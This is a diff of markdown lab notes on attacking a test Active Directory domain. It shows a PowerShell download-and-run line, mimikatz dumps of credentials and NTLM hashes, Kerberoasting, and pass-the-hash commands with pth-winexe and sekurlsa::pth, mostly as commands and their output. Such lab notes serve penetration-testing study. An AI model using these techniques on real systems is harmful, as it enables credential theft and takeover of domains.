@@ -1,5 +1,6 @@
 # Attacking Active Directory
 ## Lab Environment
+
 |Server|IP Address|OS|Function|
 |---|---|---|---|
 |dc.lab.vx|192.168.17.141|Windows Server 2016|Domain Controller|
@@ -30,15 +31,8 @@ powershell.exe -nop -Exec Bypass -Command (New-Object System.Net.WebClient).Down
 |`sekurlsa::logonpasswords`|Lists all available provider credentials; usually shows recently logged on user and computer credentials|
 
 - ☝️ **Note**: mimikatz needs to run from an elevated shell; running mimikatz from a non-elevated shell will not work:
+
 ```console
-
-  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
- .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
- ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
- ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
- '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
-  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
-
 mimikatz # privilege::debug
 ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
 
@@ -46,7 +40,6 @@ mimikatz # token::elevate
 Token Id  : 0
 User name :
 SID name  : NT AUTHORITY\SYSTEM
-
 
 mimikatz # lsadump::sam
 Domain : CLIENT
@@ -59,11 +52,10 @@ ERROR kuhl_m_lsadump_lsa_getHandle ; OpenProcess (0x00000005)
 
 mimikatz # sekurlsa::logonpasswords
 ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
-
-mimikatz #
 ```
 
 - Successful `lsadump::sam` example:
+
 ```console
 mimikatz # lsadump::sam
 Domain : CLIENT
@@ -156,6 +148,7 @@ Supplemental Credentials:
 ```
 
 - Successful `lsadump::lsa /patch` example:
+
 ```console
 mimikatz # lsadump::lsa /patch
 Domain : CLIENT / S-1-5-21-1540030335-1244868743-683777651
@@ -187,6 +180,7 @@ NTLM : 5a2b1b78290d381def497905d467fcff
 ```
 
 - Successful `sekurlsa::logonpasswords` example:
+
 ```console
 mimikatz # sekurlsa::logonpasswords
 
@@ -248,6 +242,7 @@ SID               : S-1-5-21-1470288461-3401294743-676794760-1104
 ```
 
 # Service Account Attack (Kerberoasting)
+
 ```console
 kerberos::list /export
 sudo apt update && sudo apt install kerberoast
@@ -260,6 +255,7 @@ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~
 
 ## pth-winexe
 - Domain account
+
 ```console
 ┌──(kali㉿kali)-[~]
 └─$ pth-winexe -U LAB/domainadmin%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.151 cmd
@@ -276,7 +272,9 @@ C:\Windows\system32>hostname
 hostname
 SVR
 ```
+
 - Local account
+
 ```console
 ┌──(kali㉿kali)-[~]
 └─$ pth-winexe -U administrator%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.151 cmd
@@ -293,10 +291,12 @@ C:\Windows\system32>hostname
 hostname
 SVR
 ```
+
 ## mimikatz - sekurlsa::pth
 ### Domain account
 - On mimikatz: run `privilege::debug` followed by `sekurlsa::pth`
 - The `sekurlsa::pth` will spawn a new cmd window
+
 ```console
 mimikatz # privilege::debug
 Privilege '20' OK
@@ -322,7 +322,9 @@ NTLM    : e19ccf75ee54e06b06a5907af13cef42
    \_ des_cbc_md4       OK
    \_ *Password replace @ 00000129DC9D00E8 (32) -> null
 ```
+
 - Connect to the target machine in the new cmd window
+
 ```console
 C:\Windows\system32>whoami
 lab\mike
@@ -346,8 +348,10 @@ lab\domainadmin
 C:\Windows\system32>hostname
 DC
 ```
+
 ### Local account
 - Using `sekurlsa::pth` for local accounts is similar as domain accounts; just user `*` or `workgroup` for the `/domain` option
+
 ```console
 mimikatz # privilege::debug
 Privilege '20' OK
@@ -373,8 +377,10 @@ NTLM    : e19ccf75ee54e06b06a5907af13cef42
    \_ des_cbc_md4       OK
    \_ *Password replace @ 00000129DBEE4128 (32) -> null
 ```
+
 - Connect to the target machine in the new cmd window
 - ☝️ **Note**: `sekurlsa::pth` for local accounts must use the built-in `administrator` account, because only PsExec uses the `ADMIN$` to run the new cmd
+
 ```console
 C:\Windows\system32>whoami
 lab\mike
